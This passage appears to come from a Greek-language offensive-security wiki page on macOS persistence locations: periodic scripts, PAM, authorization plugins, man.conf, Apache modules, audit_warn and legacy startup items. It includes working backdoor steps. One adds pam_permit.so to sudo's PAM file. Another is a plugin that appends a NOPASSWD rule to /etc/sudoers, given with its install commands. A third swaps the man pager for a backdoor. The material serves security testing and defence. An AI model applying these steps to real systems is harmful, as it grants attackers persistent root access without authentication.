Τα periodic scripts (**`/etc/periodic`**) εκτελούνται εξαιτίας των **launch daemons** που έχουν ρυθμιστεί στο `/System/Library/LaunchDaemons/com.apple.periodic*`. Σημειώστε ότι τα scripts που βρίσκονται στο `/etc/periodic/` **εκτελούνται** ως ο **ιδιοκτήτης του αρχείου**, οπότε αυτό δεν θα λειτουργήσει για πιθανό privilege escalation.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Υπάρχουν και άλλα περιοδικά scripts που θα εκτελεστούν, όπως υποδεικνύεται στο **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Αν καταφέρεις να γράψεις οποιοδήποτε από τα αρχεία `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`, θα εκτελεστεί **αργά ή γρήγορα**.

> [!WARNING]
> Σημείωση ότι το periodic script θα **εκτελεστεί ως ο ιδιοκτήτης του**. Έτσι, αν το script ανήκει σε κανονικό χρήστη, θα εκτελεστεί ως αυτός ο χρήστης (αυτό μπορεί να αποτρέψει επιθέσεις ανύψωσης προνομίων).

### PAM

Αναφορά: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Αναφορά: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Χρήσιμο για bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά χρειάζεσαι root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Root απαιτείται πάντα

#### Περιγραφή & Εκμετάλλευση

Επειδή το PAM επικεντρώνεται περισσότερο στην **persistence** και στο malware παρά στην εύκολη εκτέλεση εντός macOS, αυτό το blog δεν θα δώσει λεπτομερή εξήγηση — **διάβασε τα writeups για να κατανοήσεις καλύτερα αυτή την τεχνική**.

Έλεγξε τα PAM modules με:
```bash
ls -l /etc/pam.d
```
Μια persistence/privilege escalation technique abusing PAM είναι τόσο απλή όσο η τροποποίηση του /etc/pam.d/sudo, προσθέτοντας στην αρχή την εξής γραμμή:
```bash
auth       sufficient     pam_permit.so
```
Θα **φαίνεται** κάπως έτσι:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Συνεπώς, οποιαδήποτε προσπάθεια χρήσης του **`sudo` θα λειτουργήσει**.

> [!CAUTION]
> Σημειώστε ότι αυτός ο κατάλογος προστατεύεται από TCC, οπότε είναι πολύ πιθανό ότι ο χρήστης θα λάβει μια προτροπή ζητώντας πρόσβαση.

Ένα ακόμα καλό παράδειγμα είναι το su, όπου μπορείτε να δείτε ότι είναι επίσης δυνατό να δώσετε παραμέτρους στα PAM modules (και μπορείτε επίσης να backdoor αυτό το αρχείο):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugins Εξουσιοδότησης

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Αναφορά: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά χρειάζεται να είσαι root και να κάνεις επιπλέον ρυθμίσεις
- TCC bypass: ???

#### Τοποθεσία

- `/Library/Security/SecurityAgentPlugins/`
- Απαιτείται root
- Επίσης απαιτείται να διαμορφώσεις τη βάση δεδομένων εξουσιοδότησης ώστε να χρησιμοποιεί το plugin

#### Περιγραφή & Εκμετάλλευση

Μπορείς να δημιουργήσεις ένα plugin εξουσιοδότησης που θα εκτελείται όταν ένας χρήστης κάνει login για να διατηρήσεις persistence. Για περισσότερες πληροφορίες σχετικά με το πώς να δημιουργήσεις ένα από αυτά τα plugins, δες τις προηγούμενες αναφορές (και πρόσεξε: ένα κακά γραμμένο plugin μπορεί να σε κλειδώσει έξω και θα χρειαστεί να καθαρίσεις το Mac σου από το recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Μετακινήστε** το bundle στη θέση που θα φορτωθεί:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Τέλος, προσθέστε τον **κανόνα** για να φορτωθεί αυτό το Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Το **`evaluate-mechanisms`** θα ενημερώσει το πλαίσιο εξουσιοδότησης ότι θα χρειαστεί να **καλέσει έναν εξωτερικό μηχανισμό για εξουσιοδότηση**. Επιπλέον, το **`privileged`** θα κάνει να εκτελείται από root.

Ενεργοποιήστε το με:
```bash
security authorize com.asdf.asdf
```
Και στη συνέχεια η **ομάδα staff πρέπει να έχει πρόσβαση sudo** (διαβάστε `/etc/sudoers` για επιβεβαίωση).

### Man.conf

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Χρήσιμο για bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά χρειάζεται να είστε root και ο χρήστης πρέπει να χρησιμοποιήσει man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Απαιτείται root
- **`/private/etc/man.conf`**: Κάθε φορά που χρησιμοποιείται man

#### Description & Exploit

Το αρχείο ρυθμίσεων **`/private/etc/man.conf`** υποδεικνύει το binary/script που θα χρησιμοποιηθεί όταν ανοίγονται αρχεία τεκμηρίωσης man. Έτσι, η διαδρομή προς το εκτελέσιμο μπορεί να τροποποιηθεί ώστε κάθε φορά που ο χρήστης χρησιμοποιεί man για να διαβάσει κάποια docs να εκτελείται ένα backdoor.

Για παράδειγμα ορίστε σε **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Και στη συνέχεια δημιουργήστε το `/tmp/view` ως:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Ανάλυση**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά πρέπει να είσαι root και ο apache να τρέχει
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Το Httpd δεν έχει entitlements

#### Τοποθεσία

- **`/etc/apache2/httpd.conf`**
- Απαιτείται root
- Ενεργοποίηση: Όταν ξεκινάει το Apache2

#### Περιγραφή & Exploit

Μπορείτε να υποδείξετε στο `/etc/apache2/httpd.conf` να φορτωθεί ένα module προσθέτοντας μια γραμμή όπως:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Με αυτόν τον τρόπο το compiled module σας θα φορτωθεί από τον Apache. Το μόνο που χρειάζεται είναι είτε να το **υπογράψετε με ένα έγκυρο πιστοποιητικό Apple**, είτε να **προσθέσετε ένα νέο έμπιστο πιστοποιητικό** στο σύστημα και να το **υπογράψετε** με αυτό.

Στη συνέχεια, αν χρειάζεται, για να βεβαιωθείτε ότι ο server θα ξεκινήσει, μπορείτε να εκτελέσετε:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Παράδειγμα κώδικα για το Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά χρειάζεται να είστε root, να τρέχει το auditd και να προκαλέσετε μια προειδοποίηση
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
- Απαιτείται root
- **Trigger**: Όταν το auditd ανιχνεύει μια προειδοποίηση

#### Description & Exploit

Κάθε φορά που το auditd ανιχνεύει μια προειδοποίηση, το script **`/etc/security/audit_warn`** **εκτελείται**. Οπότε μπορείτε να προσθέσετε το payload σας σε αυτό.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Μπορείτε να προκαλέσετε μια προειδοποίηση με `sudo audit -n`.

### Στοιχεία εκκίνησης

> [!CAUTION] > **Αυτό έχει αποσυρθεί, οπότε δεν θα πρέπει να βρεθεί τίποτα σε αυτούς τους καταλόγους.**

Το **StartupItem** είναι ένας κατάλογος που θα πρέπει να τοποθετηθεί είτε μέσα στο `/Library/StartupItems/` είτε στο `/System/Library/StartupItems/`. Μόλις δημιουργηθεί αυτός ο κατάλογος, πρέπει να περιέχει δύο συγκεκριμένα αρχεία:

1. An **rc script**: Ένα shell script που εκτελείται κατά την εκκίνηση.
2. A **plist file**, συγκεκριμένα με το όνομα `StartupParameters.plist`, το οποίο περιέχει διάφορες ρυθμίσεις διαμόρφωσης.

Βεβαιωθείτε ότι τόσο το rc script όσο και το αρχείο `StartupParameters.plist` είναι σωστά τοποθετημένα μέσα στον κατάλογο **StartupItem**, ώστε η διαδικασία εκκίνησης να τα αναγνωρίσει και να τα χρησιμοποιήσει.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Δεν μπορώ να βρω αυτό το component στο macOS μου, οπότε για περισσότερες πληροφορίες δείτε την αναφορά

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Εισήχθη από την Apple, **emond** είναι ένας μηχανισμός καταγραφής που φαίνεται να είναι ανεπαρκώς ανεπτυγμένος ή ενδεχομένως εγκαταλειμμένος, ωστόσο παραμένει προσβάσιμος. Αν και δεν είναι ιδιαίτερα χρήσιμος για έναν διαχειριστή Mac, αυτή η ασαφής υπηρεσία θα μπορούσε να χρησιμεύσει ως διακριτική μέθοδος επίμονης παρουσίας για threat actors, πιθανώς απαρατήρητη από τους περισσότερους διαχειριστές macOS.

Για όσους γνωρίζουν την ύπαρξή του, η ανίχνευση οποιασδήποτε κακόβουλης χρήσης του **emond** είναι απλή. Το LaunchDaemon του συστήματος για αυτήν την υπηρεσία αναζητά scripts προς εκτέλεση σε έναν μοναδικό κατάλογο. Για να το ελέγξετε, μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Τοποθεσία

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Απαιτείται root
- **Ενεργοποίηση**: Με XQuartz

#### Περιγραφή & Εκμετάλλευση

Το XQuartz είναι **δεν εγκαθίσταται πλέον σε macOS**, οπότε για περισσότερες πληροφορίες δείτε το writeup.

### ~~kext~~

> [!CAUTION]
> Είναι τόσο περίπλοκο να εγκαταστήσεις kext ακόμα και ως root, που δεν θα το θεωρήσω τρόπο για escape από sandboxes ή ακόμα και για persistence (εκτός αν έχεις exploit)

#### Τοποθεσία

Για να εγκαταστήσεις ένα KEXT ως startup item, χρειάζεται να **εγκατασταθεί σε μία από τις ακόλουθες τοποθεσίες**:

- `/System/Library/Extensions`
- KEXT αρχεία ενσωματωμένα στο λειτουργικό σύστημα OS X.
- `/Library/Extensions`
- KEXT αρχεία εγκατεστημένα από λογισμικό τρίτων

Μπορείς να εμφανίσεις τα τρέχοντα φορτωμένα kext αρχεία με:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Για περισσότερες πληροφορίες σχετικά με [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Τοποθεσία

- **`/usr/local/bin/amstoold`**
- Απαιτείται root

#### Περιγραφή & Εκμετάλλευση

Φαίνεται ότι το `plist` από `/System/Library/LaunchAgents/com.apple.amstoold.plist` χρησιμοποιούσε αυτό το binary ενώ εκτίθεται μια XPC υπηρεσία... το θέμα είναι ότι το binary δεν υπήρχε, οπότε μπορούσες να τοποθετήσεις κάτι εκεί και όταν κληθεί η XPC υπηρεσία το binary σου θα κληθεί.

Δεν μπορώ πλέον να το βρω στο macOS μου.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Τοποθεσία

- **`/Library/Preferences/Xsan/.xsanrc`**
- Απαιτείται root
- **Trigger**: Όταν η υπηρεσία εκτελείται (σπάνια)

#### Περιγραφή & Εκμετάλλευση

Φαίνεται ότι δεν είναι πολύ συνηθισμένο να τρέχει αυτό το script και δεν μπόρεσα καν να το βρω στο macOS μου, οπότε για περισσότερες πληροφορίες δείτε την αναφορά.

### ~~/etc/rc.common~~

> [!CAUTION] > **Αυτό δεν λειτουργεί σε σύγχρονες εκδόσεις του MacOS**

Είναι επίσης δυνατό να τοποθετήσετε εδώ **εντολές που θα εκτελεστούν κατά την εκκίνηση.** Παράδειγμα ενός συνηθισμένου rc.common script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence τεχνικές και εργαλεία

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Αναφορές

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
